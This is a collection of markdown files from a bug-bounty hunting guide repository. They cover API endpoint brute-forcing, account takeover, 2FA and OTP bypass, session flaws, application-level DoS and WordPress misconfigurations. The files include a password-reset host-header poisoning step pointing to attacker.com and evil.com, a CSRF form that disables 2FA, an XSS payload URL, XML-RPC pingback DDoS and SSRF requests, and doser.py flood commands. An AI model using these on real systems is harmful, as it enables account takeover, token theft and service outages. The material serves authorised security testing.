{"source": "github", "repo": "KathanP19/HowToHunt", "file": "API_Testing/Hidden_API_Functionality_Exposure.md", "url": "https://github.com/KathanP19/HowToHunt/blob/master/API_Testing/Hidden_API_Functionality_Exposure.md", "content": "# Hidden API Functionality Exposure\n- Application programming interfaces (APIs) have become a critical part of almost every business. APIs are responsible for transferring information between systems within a company or to external companies. For example, when you log in to a website like Google or Facebook, an API processes your login credentials to verify they are correct.\n\n1. Swagger UI Documentation\n2. Dictionary Attack | Brute force\n3. Common wordlist for API Enum :\n- https://wordlists.assetnote.io/\n- https://github.com/Net-hunter121/API-Wordlist\n\n## Steps to Perform This Attack :\n```\nStep 1 : Capture the request into Burp, Send the request to repeater and intruder tab.\nStep 2 : Add the endpoint into the intruder tab and add the payload from the word-list.\nStep 3 : First use dictionary attack with SecLists (https://github.com/danielmiessler/SecLists) on the Endpoint.\nStep 4 : Either use your customized list or use the ones which I have provided in the above step.\nStep 5 : Then simply start the attack, start checking for 200 status.\nStep 7 : Once there is HTTP 200 OK status, start the recursive scan on the same endpoint for juicy information like swagger doc and so on.\nstep 8 : Other method is to change the API version and try bruteforcing the same endpoint\nEg: Redacted.com/api/v1/{Endpoint} ----- Redacted.com/api/v2/{Endpoint}\n```\n* Note: There will be minimum limits per request which will be assigned without API keys so make sure to utilize manual approach as much as you can, then the rest can be automated for scanning the vulnerability in API with automated tools.\n\n## Contributor:\n- [N3T_hunt3r](https://twitter.com/N3T_hunt3r)\n", "timestamp": "2025-10-21T22:01:56.357004"}
{"source": "github", "repo": "KathanP19/HowToHunt", "file": "Account_Takeovers_Methodologies/Account_Takeovers_Methods.md", "url": "https://github.com/KathanP19/HowToHunt/blob/master/Account_Takeovers_Methodologies/Account_Takeovers_Methods.md", "content": "\n## Chaining Session Hijacking with XSS\n```\n1.I have added a session hijacking method in broken authentication and session management. \n2.If you find that on target.\n3.Try anyway to steal cookies on that target.\n4.Here I am saying look for xss .\n5.If you find xss you can steal the cookies of victim and using session hijacking you can takeover the account of victim.\n```\n##  No Rate Limit On Login With Weak Password Policy\n```\nSo if you find that target have weak password policy, try to go for no rate limit attacks in poc shows by creating very weak password of your account.\n\n(May or may not be accepted)\n```\n## Password Reset Poisioning Leads To Token Theft\n```\n1.Go to password reset funtion.\n2.Enter email and intercept the request.\n3.Change host header to some other host i.e,\n    Host:target.com\n    Host:attacker.com\n  also try to add some headers without changing host like\n    X-Forwarded-Host: evil.com\n    Referrer: https://evil.com\n4.Forward this if you find that in next request attacker.com means you managed to successfully steal the token. :)\n```\n## Using  Auth Bypass\n```\nCheck out Auth Bypass method, there is a method for OTP bypass via response manipulation, this can leads to account takeovers.\n1.Enter the wrong auth code / Password\n2.Capture a auth request in burpsuite and send it to repeater \n3.Check for the resoponse\n4.Change the respone by manipulating the following parameters\n  {“code”:”invalid_credentials”} -> {“code”:”valid_credentials”}\n  {“verify”:”false”}             -> {“verify”:”true”}\n  \n  \n```\n## Try For CSRF On\n```\n1.Change Password function.\n2.Email change\n3.Change Security Question\n```\n## Token Leaks In Response\n\n* So there are multiple ways to do it but all are same.\n\n* So I will sharing my method that I have learnt here .\n\n* Endpoints:(Register,Forget Password)\n\n* Steps(For Registration):\n```\n  1. For registeration intercept the signup request that contains the data you have entered.\n  2. Click on action -> do -> intercept the response to this request.\n  3. Click forward.\n  4. Check response if that contains any link, any token or OTP.\n ```\n ------------------------\n * Steps (For password reset):\n ``` \n  1. Intercept the forget password option.\n  2. Click on action -> do -> intercept the response to this request.\n  3. Click forward.\n  4. Check response if that contains any link,any token or OTP.\n ```\n\n## Reference:\n* Various Source From Google,Twitter,Medium\n* https://avanishpathak.medium.com/an-account-takeover-vulnerability-due-to-response-manipulation-e23fe629bd1\n\n## Author\n* [@Virdoex_hunter](https://twitter.com/Virdoex_hunter)\n* [@v3daxt](https://twitter.com/v3daxt)\n", "timestamp": "2025-10-21T22:01:57.019496"}
{"source": "github", "repo": "KathanP19/HowToHunt", "file": "Application_Level_DoS/ALD_Methods.md", "url": "https://github.com/KathanP19/HowToHunt/blob/master/Application_Level_DoS/ALD_Methods.md", "content": "\n## 1. Email Bounce Issues\n- Check if Application has Invite Functionality\n- Try sending Invites to Invalid Email Accounts\n- Try to find Email Service Provider such as AWS SES , Hubspot , Campaign Monitor\n**Note:  You can find Email Service Provider by checking Email Headers**\n* Once you have the Email Service Provider, Check there Hard Bounce Limits. Here are the limits for some of them:\n  \n  **1. Hubspot Hard bounces:** HubSpot's hard bounce limit is 5%. For reference, many ISPs prefer bounce rates to be under 2%.\n  \n  **2. AWS SES:** The rate of SES ranges from first 2-5% then 5-10%\n\n***Impact: Once the Hard Bounce Limits are reached, Email Service Provider will block the Company which means, No Emails would be sent to the Users !***\n\n## 2. Long Password DoS Attack\n\n- As the value of password is hashed and then stored in Databases. If there is no limit on the length of the Password, it can lead to consumption of resources for Hashing the Long Password.\n\n**How to test?**\n\n- Use a Password of length around 150-200 words to check the presense of Length Restriction\n- If there is no Restriction, Choose a longer password and keep a eye on Response Time\n- Check if the Application Crashes for few seconds \n\n**Where to test?**\n\n- Registration Password Field is usually restricted but the Length of Password on the Forgot Password Page and the Change Password (As Authenticated User) Functionality is usually missing.\n\n\n## 3. Long String DOS\n\n* When you set some string so long so server cannot process it anymore it cause DOS sometime\n\n**How to test**\n```\nCreate app and put field like username or address or even profile picture name parameter ( second refrence ) like 1000 character of string . \nSearch A's account from B's account either it will\n```\n- Either it will keeping on searching for long time\n- Either the application will crash (500 - Error Code)\n\n\n## Use Password From Password.txt\n⚠️`it's not recommended using more than 5000 characters as password.`\n- Here is the [Password.txt](https://raw.githubusercontent.com/KathanP19/HowToHunt/master/Application_Level_DoS/Password.txt)\n\n## 4. Permanent DOS to victim\nThis is not Application Level DOS but a Permanent DOS to victim.\nIn some website user get blocked after trying to loging in with wrong credidentials.We will untilize this feature as bug :D.\n\n**How to check**.\n- Go to login page of example.com.\n- Now enter valid account email and wrong password .\n- Try to login with these details for few times(at least 10-20 times).You can use repeater or intruder in burpsuite.\n- If your account get blocked, check the blocking time period.If the blocking time period is more than 30 min .You can report it.\n\n**Point to Remember**\n- Make sure there is no captcha during login because we cann't make any automated tool to loop the request.\n- Make sure Old session are expired after being blocked.\n\n**What is priority of this bug?**\n- If the user get permanently block after some wrong attempts this is considered as P2. \n- If the user get temporarly block this is considered as P3/P4.\n\nDuring report try to add impact by saying that you can permanently block user account by looping this request with some intervals.\n\n\n## Reference : \n\\- Email Bounce Issues\n* [https://medium.com/bugbountywriteup/an-unexpected-bounty-email-bounce-issues-b9f24a35eb68](https://medium.com/bugbountywriteup/an-unexpected-bounty-email-bounce-issues-b9f24a35eb68)\n\n\\- Long Password DoS Attack\n\n- https://www.acunetix.com/vulnerabilities/web/long-password-denial-of-service/\n- https://hackerone.com/reports/738569\n- https://hackerone.com/reports/167351\n\n\\- Long String DOS\n- [https://medium.com/@shahjerry33/long-string-dos-6ba8ceab3aa0](https://medium.com/@shahjerry33/long-string-dos-6ba8ceab3aa0)\n- https://hackerone.com/reports/764434\n\n\\- Permanent DOS to victim\n- https://youtu.be/5drIMXCQuNw\n\n## Author: \n* [Keshav Malik](https://twitter.com/g0t_rOoT_)\n* [Fani Malik](https://twitter.com/fanimalikhack)\n\n", "timestamp": "2025-10-21T22:01:57.576700"}
{"source": "github", "repo": "KathanP19/HowToHunt", "file": "Authentication_Bypass/2FA_Bypasses.md", "url": "https://github.com/KathanP19/HowToHunt/blob/master/Authentication_Bypass/2FA_Bypasses.md", "content": "# **2FA Bypass Techniques**\n\n## **Introduction**\nTwo-Factor Authentication (2FA) is a security mechanism designed to add an extra layer of protection by requiring users to provide an additional verification code after entering their credentials. However, improper implementations of 2FA can introduce various security flaws that allow attackers to bypass authentication.\n\nThis document outlines **common 2FA bypass techniques**, including **response manipulation, brute-force attacks, backup code abuse, and session hijacking**. Each method is detailed with examples and exploitation steps.\n\nFor a **visual reference**, a **[2FA Bypass Mindmap](https://mm.tt/1736437018?t=SEeZOmvt01)** provides an overview of different attack vectors.\n\n---\n\n## **Common 2FA Bypass Techniques**\n\n### **Index of Techniques**\n| #  | **Technique** |\n|----|--------------|\n| **1**  | Response Manipulation |\n| **2**  | Status Code Manipulation |\n| **3**  | 2FA Code Leakage in Response |\n| **4**  | JavaScript File Analysis |\n| **5**  | 2FA Code Reusability |\n| **6**  | Lack of Brute-Force Protection |\n| **7**  | Missing 2FA Code Integrity Validation |\n| **8**  | CSRF on 2FA Disabling |\n| **9**  | Password Reset Disables 2FA |\n| **10** | Backup Code Abuse |\n| **11** | Clickjacking on 2FA Disabling Page |\n| **12** | Enabling 2FA Without Expiring Active Sessions |\n| **13** | Bypass 2FA with `null` or `000000` |\n\n---\n\n## **1. Response Manipulation**\nSome 2FA implementations return a JSON response indicating whether authentication was successful. **Altering the response** can bypass restrictions.\n\n### **Exploitation**\n- Intercept the response using **Burp Suite** or **a browser's developer tools**.\n- Look for a response like:\n  ```json\n  { \"success\": false }\n  ```\n- Change it to:\n  ```json\n  { \"success\": true }\n  ```\n- If client-side validation is weak, access is granted.\n\n---\n\n## **2. Status Code Manipulation**\nSome applications rely on HTTP status codes to determine authentication success.\n\n### **Exploitation**\n- If a **4xx error** (e.g., `401 Unauthorized`) is received after entering a **wrong** 2FA code, modify the response to:\n  ```\n  HTTP/1.1 200 OK\n  ```\n- Some applications may grant access **even if authentication failed**.\n\n---\n\n## **3. 2FA Code Leakage in API Responses**\nSome applications accidentally **leak the 2FA code** in their API response.\n\n### **Exploitation**\n- Intercept the **request triggering the 2FA code**.\n- Examine the API response.\n- If the response contains:\n  ```json\n  { \"otp\": \"123456\" }\n  ```\n  - The attacker can directly **use the leaked OTP**.\n\n---\n\n## **4. JavaScript File Analysis**\nSome applications store **2FA-related logic** in JavaScript files.\n\n### **Exploitation**\n- Check for exposed `.js` files in the application.\n- Look for sensitive **hardcoded values** like:\n  ```javascript\n  var otp = \"123456\";\n  ```\n- Attackers can **extract OTP verification logic** or **static OTPs**.\n\n---\n\n## **5. 2FA Code Reusability**\nSome applications **do not expire OTPs after use**, allowing attackers to **reuse** them.\n\n### **Exploitation**\n- Obtain a **valid OTP** from a previous session.\n- Attempt to reuse the same OTP for authentication.\n- If the system does not enforce **one-time use**, the **old OTP grants access**.\n\n---\n\n## **6. Lack of Brute-Force Protection**\nApplications that **do not limit OTP attempts** allow brute-forcing.\n\n### **Exploitation**\n- Identify the **number of OTP digits** (commonly `4`-`6`).\n- Use a tool like `Burp Intruder` to brute-force:\n  ```\n  000000 - 999999\n  ```\n- **Weak OTP validation** allows attackers to guess the correct OTP.\n\n---\n\n## **7. Missing 2FA Code Integrity Validation**\nSome systems accept **any valid OTP**, even from different accounts.\n\n### **Exploitation**\n- Obtain a **valid OTP** for **Account A**.\n- Use the **same OTP** to authenticate **Account B**.\n- If the system **does not verify OTP ownership**, access is granted.\n\n---\n\n## **8. CSRF on 2FA Disabling**\nSome applications **lack CSRF protection** when disabling 2FA.\n\n### **Exploitation**\n- Construct a **malicious request** to disable 2FA:\n  ```html\n  <form action=\"https://victim-site.com/disable-2fa\" method=\"POST\">\n      <input type=\"hidden\" name=\"disable\" value=\"true\">\n      <input type=\"submit\" value=\"Click to win a prize!\">\n  </form>\n  ```\n- Trick the victim into **clicking the form**, disabling their 2FA.\n\n---\n\n## **9. Password Reset Disables 2FA**\nSome systems **disable 2FA** when a user resets their password.\n\n### **Exploitation**\n- If an account has 2FA enabled, attempt a **password reset**.\n- Check if **2FA is still active** after resetting the password.\n- If **2FA is disabled**, log in **without 2FA authentication**.\n\n---\n\n## **10. Backup Code Abuse**\nBackup codes provide **alternative login options** when OTP is unavailable.\n\n### **Exploitation**\n- If backup codes are stored **insecurely**, they can be leaked or stolen.\n- Some applications **do not expire backup codes after use**, allowing repeated exploitation.\n\n---\n\n## **11. Clickjacking on 2FA Disabling Page**\nSome applications allow **2FA to be disabled** without additional verification.\n\n### **Exploitation**\n- Load the **2FA disabling page** in an `<iframe>`.\n- Trick the victim into **clicking the iframe** (e.g., by overlaying it over an attractive button).\n- **2FA is disabled without the victim realizing it.**\n\n---\n\n## **12. Enabling 2FA Does Not Expire Active Sessions**\nIn some applications, **enabling 2FA** does not log out active sessions.\n\n### **Exploitation**\n- If an attacker hijacks a **session before 2FA is enabled**, they **retain access** even after 2FA is enforced.\n- Attackers can **maintain persistence** despite 2FA protection.\n\n---\n\n## **13. Bypassing 2FA with `null` or `000000`**\nSome poorly implemented 2FA mechanisms accept **default or empty codes**.\n\n### **Exploitation**\n- Enter `null`, `000000`, or similar **default values** in the OTP field.\n- If the system **accepts these values**, authentication is bypassed.\n\n---\n\n## **Further Reading**\n- **[Testing Two-Factor Authentication](https://research.nccgroup.com/2021/06/10/testing-two-factor-authentication/)** by **NCC Group**\n\n---\n\n## **Authors**\n- **[Harsh Bothra](https://twitter.com/harshbothra_)**\n- **[Vishal Saini](https://twitter.com/k4k4r07)**\n\n---\n*Enhanced and reformatted for HowToHunt repository by [remonsec](https://x.com/remonsec)*\n", "timestamp": "2025-10-21T22:01:58.613468"}
{"source": "github", "repo": "KathanP19/HowToHunt", "file": "Authentication_Bypass/OTP_Bypass.md", "url": "https://github.com/KathanP19/HowToHunt/blob/master/Authentication_Bypass/OTP_Bypass.md", "content": "# **OTP Bypass Techniques in Account Registration and Authentication**\n\n## **Introduction**\nOne-Time Passwords (OTP) are commonly used for authentication and verification in account registration, login, and critical actions. However, poor OTP implementations can lead to **authentication bypass, account takeover, and unauthorized access**.\n\nThis document outlines **various OTP bypass techniques**, including **response manipulation, rate limit exploitation, default OTP usage, and session validation flaws**.\n\n---\n\n## **OTP Bypass via Response Manipulation**\n### **Method 1: Manipulating OTP Verification Response**\n#### **Steps:**\n1. Register an account with a mobile number and request an OTP.\n2. Enter an **incorrect OTP** and capture the request using **Burp Suite**.\n3. Intercept and **modify the server's response**:\n   - Original response:\n     ```json\n     {\"verificationStatus\":false,\"mobile\":9072346577,\"profileId\":\"84673832\"}\n     ```\n   - Change to:\n     ```json\n     {\"verificationStatus\":true,\"mobile\":9072346577,\"profileId\":\"84673832\"}\n     ```\n4. Forward the manipulated response.\n5. The system authenticates the account despite the incorrect OTP.\n\n**Impact:**  \n- **Full account takeover** without providing a valid OTP.\n\n---\n\n### **Method 2: Changing Error Response to Success**\n#### **Steps:**\n1. Go to the **login page** and enter your phone number.\n2. When prompted for an OTP, enter an **incorrect OTP**.\n3. Capture the **server response**:\n   ```json\n   { \"error\": \"Invalid OTP\" }\n   ```\n4. Modify it to:\n   ```json\n   { \"success\": \"true\" }\n   ```\n5. Forward the response.\n6. If the server accepts this modification, you gain access without entering a valid OTP.\n\n**Impact:**  \n- **Authentication bypass leading to account takeover**.\n\n---\n\n### **Method 3: OTP Verification Across Multiple Accounts**\n#### **Steps:**\n1. Register **two different accounts** with separate phone numbers.\n2. **Enter the correct OTP** for one account and intercept the request.\n3. Capture the server response and note **status:1** (success).\n4. Now, attempt to verify the second account with an **incorrect OTP**.\n5. Intercept the server response where the status is **status:0** (failure).\n6. Change **status:0** to **status:1** and forward the response.\n7. If successful, you bypass OTP authentication.\n\n**Impact:**  \n- **Bypassing OTP verification for multiple accounts**.\n\n---\n\n## **OTP Bypass Using Form Resubmission in Repeater**\n#### **Steps:**\n1. Register an account using a **non-existent phone number**.\n2. Intercept the OTP request in **Burp Suite**.\n3. Send the request to **Repeater** and forward it.\n4. Modify the phone number in the request to **your real number**.\n5. If the system **sends the OTP to your real number**, use it to register under the **fake number**.\n\n**Impact:**  \n- **Unauthorized account registration using someone else's OTP**.\n\n---\n\n## **Bypassing OTP with No Rate Limiting**\n### **Steps:**\n1. **Create an account** and request an OTP.\n2. Enter an **incorrect OTP** and capture the request in Burp Suite.\n3. Send the request to **Burp Intruder** and **set a payload on the OTP field**.\n4. Set **payload type as numbers** (`000000` to `999999`).\n5. Start the attack.\n6. If **no rate limit** is enforced, the correct OTP will eventually match.\n\n**Impact:**  \n- **Complete OTP bypass through brute force**.\n\n---\n\n## **Additional OTP Bypass Test Cases**\n### **1. Default OTP Values**\n- Some applications use default OTP values such as:\n  ```\n  111111, 123456, 000000\n  ```\n- Test common default values to check for misconfigurations.\n\n### **2. OTP Leakage in Server Response**\n- Some applications leak OTPs in API responses.\n- **Intercept OTP request responses** and check if OTP is present.\n\n### **3. Checking if Old OTP is Still Valid**\n- Some systems allow the **reuse of old OTPs**.\n- Test if **previously used OTPs** are still accepted.\n\n---\n\n## **Rate Limiting Attack on OTP Verification**\n### **Steps:**\n1. **Navigate to the OTP verification endpoint**:\n   ```\n   https://abc.target.com/verify/phoneno\n   ```\n2. Enter an **invalid OTP** (e.g., `000000`).\n3. **Intercept the request** and send it to **Intruder**.\n4. Set the **OTP field as the payload position**.\n5. Use **payload type: numbers** and define a **range (000000 - 999999)**.\n6. Start the attack.\n7. Identify a **response length change**, which may indicate the correct OTP.\n\n**Impact:**  \n- **Brute-force attack leading to OTP bypass and account takeover**.\n\n---\n\n## **Contributors**\n- **[@akshaykerkar13](https://twitter.com/akshaykerkar13)**\n- **[@Yn0tWhy](https://twitter.com/Yn0tWhy)**\n- **[@Virdoex_hunter](https://twitter.com/Virdoex_hunter)**\n- **[@febinrev](https://twitter.com/febinrev)**\n- **[@fani_malik](https://twitter.com/fanimalikhack)**\n- **[@v3daxt](https://twitter.com/v3daxt)**\n- **[@prakhar0x01](https://twitter.com/prakhar0x01)**\n\n---\n*Enhanced and reformatted for HowToHunt repository by [remonsec](https://x.com/remonsec)*\n", "timestamp": "2025-10-21T22:01:58.712075"}
{"source": "github", "repo": "KathanP19/HowToHunt", "file": "Broken_Auth_And_Session_Management/Session_based_bugs.md", "url": "https://github.com/KathanP19/HowToHunt/blob/master/Broken_Auth_And_Session_Management/Session_based_bugs.md", "content": "# Broken Authentication And Session Management.\n\n### Old Session Does Not Expire After Password Change:\n* Steps:\n```\n      1.create An account On Your Target Site\n      2.Login Into Two Browser With Same Account(Chrome, FireFox.You Can Use Incognito Mode As well) \n      3.Change You Password In Chrome, On Seccessfull Password Change Referesh Your Logged in Account In FireFox/Incognito Mode.\n      4.If you'r still logged in Then This Is a Bug\n```      \n\n### Session Hijacking (Intended Behavior)\n* Steps:\n```\n    1.Create your account\n    2.Login your account\n    3.Use cookie editor extension in browser\n    4.Copy all the target cookies\n    5.Logout your account\n    6.Paste that cookies in cookie editor extension\n    7.Refresh page if you are logged in than this is a session hijacking\n```  \n`Impact:` If attacker get cookies of victim it will leads to account takeover.\n \n \n### Password reset token does not expire (Insecure Configurability)\n* Steps:\n```\n      1.Create your account on target Site.\n      2.request for a forget password token.\n      3.Don't use that link\n      4.Instead logged in with your old password and change your email to other.\n      5.Now use that password link sents to old email and check if you are able to change your password if yes than there is the litle bug.\n ```    \n \n ### Server security misconfiguration -> Lack of security headers -> Cache control for a security page\n * Steps :\n ``` \n     1. Login to the application\n     2. Navigate around the pages\n     3. Logout\n     4. Press (Alt+left-arrow) buttons\n     5. If you are logged in or can view the pages navigated by the user. Then you found a bug.\n  ```\n  `Impact:` At a PC cafe, if a person was in a very important page with alot of details and logged out, then another person comes and clicks back (because he didnt close the browser) then data is exposed. User information leaked\n \n ### Broken Authentication To Email Verification Bypass (P4) :\n  `category` : P4 >> Broken Authentication and Session Management >> Failure to Invalidate Session >> On Password Reset and/or Change\n\n* Steps To Reproduce:\n``` \n    1)First You need to make a account & You will receive a Email verification link.\n    2)Application in my case give less Privileges & Features to access if not verified.\n    3)Logged into the Application & I change the email Address to Email B.\n    4)A Verification Link was Send & I verified that.\n    5) Now I again Changed the email back to Email I have entered at the time of account creation.\n    6) It showed me that my Email is Verified.\n    7) Hence , A Succesful Email verfication Bypassed as I haven't Verified the Link which was sent to me in the time of account creation still my email got verified.\n    8)Didn't Receive any code again for verification when I changed back my email & When I open the account it showed in my Profile that its Verified Email.\n```\n\n`Impact` :\nEmail Verfication was bypassed due to Broken Authentication Mechanism , Thus more Privileged account can be accessed by an attacker making website prone to Future Attacks.    \n  Happy Hacking:)\n  \n  ### Email Verification Bypass (P3/P4)\n  * Steps :\n   ``` \n    1)First You need to Create an account with Your Own Email Address.\n    2)After Creating An Account A Verification Link will be sent to your account.\n    3)Dont Use The Email Verification link. Change Your Email to Victim's Email.\n    4)Now Go in Your Email and Click on Your Own Email Verification Link.\n    5)if the Victim's Email Get Verified then This is a Bug.\n```\n`Impact` : Email Verfication Bypass\n\n ### Old Password Reset Token Not Expiring Upon Requesting New One (Sometimes P4) :\n  * Steps :\n ``` \n    1)First You need to Create an account with a Valid Email Address.\n    2)After Creating An Account log out from your Account and Navigate on Forgot Password Page.\n    3)Request a Password Reset Link for your Account.A Verification Link will be sent to your account.\n    4)Without Using this Password Reset Link Request A New Password Reset Link.\n    5)Now go in Your email and Use 1st Password Reset Link Rather than Using 2nd One And Change Your Password.\n    6) If You Are Able to Change Your Password Than This Is a tiny Bug ;).\n```\n* Note:- Some Companies Won't Accept it As Valid Issue. \n\n### Password Reset Token Not Expiring After Password Change (P4):\n  * Steps :\n ``` \n    1)First You need to Create an account with a Valid Email Address.\n    2)After Creating An Account log out from your Account and Navigate on Forgot Password Page.\n    3)Request a Password Reset Link for your Account.\n    4)Use The Password Reset Link And Change The Password, After Changing the Password Login to Your Account.\n    5)Now Use The Old Password Reset Link To Change The Password Again.\n    6) If You Are Able to Change Your Password Again Than This Is a tiny Bug  ;).\n```\n\n### Insufficient account process validation leads to account takeover (P3/P4):\n   * Steps :\n```\n      1) Create an account on the website.\n      2) Go to profile section. And Change & update your details in the name parameter and before saving it Open Burp suite, turn the proxy on and then click on Save.\n      3) Now capture the request in Burp suite and send it to the Repeater tab.\n      4) Now log out from the website and go back to the Burp suite.\n      5) Now change the details email & name parameters and click on \"Go\" in the repeater tab.\n      6) Now you will be able to see 200 ok response from the web server.\n      7) Now, login into your account and go to the Profile section to confirm\n```\n\n* Thanks For Reading Guys Happy Hunting :).\n\n  ## Resources:\n  Google,Youtube.\n\n## Authors\n* [https://twitter.com/Virdoex_hunter](https://twitter.com/Virdoex_hunter) \n* Linkedin : [@chirag_Agrawal](https://www.linkedin.com/in/chirag-agrawal-770488144/), Twitter  : [@Raiders](https://twitter.com/ChiragA15977205)\n* Twitter : [Fani Malik](https://twitter.com/fanimalikhack) \n* Linkedin : [@suprit-pandurangi](https://www.linkedin.com/in/suprit-pandurangi-a90526106/)\n", "timestamp": "2025-10-21T22:01:59.914859"}
{"source": "github", "repo": "KathanP19/HowToHunt", "file": "CMS/AEM.md", "url": "https://github.com/KathanP19/HowToHunt/blob/master/CMS/AEM.md", "content": "## Adobe Experience Manager\n\n### Tools\n+ [aem-hacker](https://github.com/0ang3el/aem-hacker)\n+ [aemscan](https://github.com/Raz0r/aemscan)\n\n### Wordlist for fuzzing\n+ [aem.txt](https://raw.githubusercontent.com/clarkvoss/AEM-List/main/paths)\n\n### Resources\n+ [Approaching AEM](https://www.bugcrowd.com/resources/webinar/aem-hacker-approaching-adobe-experience-manager-web-apps/)\n+ [Securing AEM](https://www.slideshare.net/0ang3el/securing-aem-webapps-by-hacking-them)\n", "timestamp": "2025-10-21T22:02:00.458871"}
{"source": "github", "repo": "KathanP19/HowToHunt", "file": "CMS/Moodle.md", "url": "https://github.com/KathanP19/HowToHunt/blob/master/CMS/Moodle.md", "content": "## Mass Hunting XSS — Moodle\n* [https://dewangpanchal98.medium.com/mass-hunting-xss-moodle-ed4b50c82516](https://dewangpanchal98.medium.com/mass-hunting-xss-moodle-ed4b50c82516)\n\n## Author:\n[@th3.d1p4k](https://twitter.com/DipakPanchal05)\n", "timestamp": "2025-10-21T22:02:00.688355"}
{"source": "github", "repo": "KathanP19/HowToHunt", "file": "CMS/wordpress.md", "url": "https://github.com/KathanP19/HowToHunt/blob/master/CMS/wordpress.md", "content": "# Wordpress Common Misconfiguration\nHere I will try my best to mention all common security misconfigurations for Wordpress I saw before or officially referenced. I will be attaching all poc and reference as well\n\n# Index\n* Wordpress Detection\n* General Scan Tool\n* xmlrpc.php\n* Directory listing\n* CVE-2018-6389\n* CVE-2021-24364\n* WP Cornjob DOS\n* WP User Enumeration\n\n# Wordpress Detection\nWell, if you are reading this you already know about technology detection tool and methods.\nStill adding them below\n* Wappalyzer\n* WhatRuns\n* BuildWith\n\n# Geneal Scan Tool\n* WpScan\n\n# xmlrpc.php \nThis is one of the common issue on wordpress. To get some bucks with this misconfiguration you must have to exploit it fully, and have to show the impact properly as well.\n\n### Detection\n* visit site.com/xmlrpc.php\n* Get the error message about POST request only\n\n### Exploit\n* Intercept the request and change the method GET to POST\n* List all Methods\n    ```\n    <methodCall>\n    <methodName>system.listMethods</methodName>\n    <params></params>\n    </methodCall>\n    ```\n* Check the ```pingback.ping``` mentod is there or not\n* Perform DDOS\n    ```\n    <methodCall>\n    <methodName>pingback.ping</methodName>\n    <params><param>\n    <value><string>http://<YOUR SERVER >:<port></string></value>\n    </param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>\n    </value></param></params>\n    </methodCall>\n    ```\n* Perform SSRF (Internal PORT scan only)\n    ```\n    <methodCall>\n    <methodName>pingback.ping</methodName>\n    <params><param>\n    <value><string>http://<YOUR SERVER >:<port></string></value>\n    </param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>\n    </value></param></params>\n    </methodCall>\n    ```\n### Tool To Automate XMLRPC-Scan.\n\n[XMLRPC-Scan](https://github.com/nullfil3/xmlrpc-scan)\n\n### References\n[Bug Bounty Cheat Sheet](https://m0chan.github.io/2019/12/17/Bug-Bounty-Cheetsheet.html)\n\n[Medium Writeup](https://medium.com/@the.bilal.rizwan/wordpress-xmlrpc-php-common-vulnerabilites-how-to-exploit-them-d8d3c8600b32)\n\n[WpEngine Blog Post](https://wpengine.com/resources/xmlrpc-php/)\n\n# Directory listing\nSometimes developers forget to disable the directory listing on /wp-content/uploads. So this is the common issue on wordpress sites.\n\n### Detection\n/wp-content/uploads\n\n### Pro tip\nAdd this path to your fuzzing wordlist\n\n### References\n[H1 Report](https://hackerone.com/reports/201984)\n[H1 Report](https://hackerone.com/reports/762118)\n[H1 Report](https://hackerone.com/reports/789388)\n[H1 Report](https://hackerone.com/reports/448985)\n\n# CVE-2018-6389\nThis issue can down any Wordpress site under 4.9.3 So while reporting make sure that your target website is running wordpress under 4.9.3\n\n### Detection\nUse the URL from my gist called loadsxploit, you will get a massive js data in response.\n\n[loadsxploit](https://gist.github.com/remonsec/4877e9ee2b045aae96be7e2653c41df9)\n\n### Exploit\nYou can use any Dos tool i found Doser really fast and it shut down the webserver within 30 second\n\n[Doser](https://github.com/quitten/doser.py)\n```\npython3 doser.py -t 999 -g 'https://site.com/fullUrlFromLoadsxploit'\n```\n### References\n[H1 Report](https://hackerone.com/reports/752010)\n\n[CVE Details](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-6389)\n\n[Blog Post](https://baraktawily.blogspot.com/2018/02/how-to-dos-29-of-world-wide-websites.html)\n\n# CVE-2021-24364\nThe Jannah WordPress theme before 5.4.4 did not properly sanitize the options JSON parameter in its tie_get_user_weather AJAX action before outputting it back in the page, leading to a Reflected Cross-Site Scripting (XSS) vulnerability.\n\n### Detection and Exploit\n* Replace <Your_WP-Site-here> to your WP-site\n<Your_WP-Site-here>/wp-admin/admin-ajax.php?action=tie_get_user_weather&options=%7B%27location%27%3A%27Cairo%27%2C%27units%27%3A%27C%27%2C%27forecast_days%27%3A%275%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3Ecustom_name%27%3A%27Cairo%27%2C%27animated%27%3A%27true%27%7D\n* Wait for the pop-up!\n\n### Reference \n[NVD](https://nvd.nist.gov/vuln/detail/CVE-2021-24364)\n\n# WP Cornjob DOS\nThis is another area where you can perform a DOS attack.\n\n### Detection\n* visit site.com/wp-cron.php\n* You will see a Blank page with 200 HTTP status code\n\n### Exploit\nYou can use the same tool Doser for exploiting this \n```\npython3 doser.py -t 999 -g 'https://site.com/wp-cron.php'\n```\n### Reference\n\n[GitHub Issue](https://github.com/wpscanteam/wpscan/issues/1299)\n\n[Medium Writeup](https://medium.com/@thecpanelguy/the-nightmare-that-is-wpcron-php-ae31c1d3ae30)\n\n# WP User Enumeration\nThis issue will only acceptable when target website is hiding their current users or they are not publically available. So attacker can use those user data for bruteforcing and other staff\n\n### Detection\n* visit site.com/wp-json/wp/v2/users/\n* You will see json data with user info in response\n\n### Exploit\nIf you have xmlrpc.php and this User enumeration both presence there. Then you can chain them out by collecting username from wp-json and perform Bruteforce on them via xmlrpc.php. It will surely show some extra effort and increase the impact as well\n\n### Reference\n[H1 Report](https://hackerone.com/reports/356047)\n\n# Researcher Note\nPlease do not depend on those issues at all. I saw people only looking for those issues and nothing else. Those are good to have a look while testing for other vulnerabilities and most of the time they work good for chaining with other low bugs.\n\n# Author\n**Name:** Mehedi Hasan Remon\n\n**Handle:** [@remonsec](https://twitter.com/remonsec)\n", "timestamp": "2025-10-21T22:02:00.807859"}
